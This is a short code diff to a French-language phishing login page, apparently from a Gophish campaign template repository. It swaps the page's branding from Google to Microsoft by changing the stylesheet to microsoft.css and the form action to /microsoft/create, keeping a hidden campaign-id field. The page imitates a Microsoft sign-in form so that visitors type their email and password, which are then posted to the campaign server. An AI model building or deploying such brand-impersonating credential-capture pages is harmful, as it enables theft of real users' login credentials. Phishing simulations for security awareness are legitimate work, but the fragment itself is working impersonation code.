@@ -7,7 +7,7 @@
     <title>Connectez-vous à votre compte</title>
     <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png?raw=true"/>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
-    <link rel="stylesheet" href="/style/google.css"/>
+    <link rel="stylesheet" href="/style/microsoft.css"/>
     <script>
         function validateForm() {
             const email = document.getElementById('email');
@@ -52,7 +52,7 @@
             <p style="font-size: 24px; line-height: 28px; font-family: Segoe UI; margin-top: 15px; font-weight: 600;">
                 Se connecter</p>
         </div>
-        <form action="/google/create" method="POST" autocomplete="off">
+        <form action="/microsoft/create" method="POST" autocomplete="off">
             <input type="hidden" name="id_camp" id="id_camp" value="<?= $id_camp ?>">
             <div class="form-group">
                 <span id="email-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Entrez
